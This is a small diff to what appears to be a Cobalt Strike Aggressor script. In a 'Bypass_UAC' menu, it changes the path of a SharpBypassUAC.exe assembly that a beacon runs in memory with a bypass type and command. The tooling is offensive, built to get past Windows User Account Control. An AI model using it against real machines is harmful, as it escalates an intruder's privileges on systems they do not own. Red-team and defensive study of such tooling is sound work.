@@ -371,7 +371,7 @@ menu "Bypass_UAC" {
   }
   sub BypassUAC {
       $arg = join(' ', @("-b",$3['type'],"-e",$3['cmd']));
-      bexecute_assembly($bid, script_resource("/scripts/AuthPromote/My/SharpBypassUac.exe"), $arg);
+      bexecute_assembly($bid, script_resource("/scripts/AuthPromote/SharpBypassUAC.exe"), $arg);
   }
   sub ComputerDefaults{
       $Rch = "x86";
